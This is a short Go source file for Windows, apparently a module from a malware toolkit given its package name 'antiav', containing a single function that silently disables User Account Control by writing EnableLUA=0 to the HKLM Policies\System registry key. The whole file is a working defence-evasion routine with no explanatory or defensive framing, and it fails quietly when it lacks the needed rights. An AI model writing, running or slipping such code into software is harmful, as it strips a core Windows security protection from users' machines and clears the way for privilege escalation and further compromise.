//go:build windows

package antiav

import "golang.org/x/sys/windows/registry"

func DisableUAC() {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", registry.ALL_ACCESS)

	if err != nil {
		return
	}
	defer k.Close()

	err = k.SetDWordValue("EnableLUA", 0)
	if err != nil {
		return
	}
}
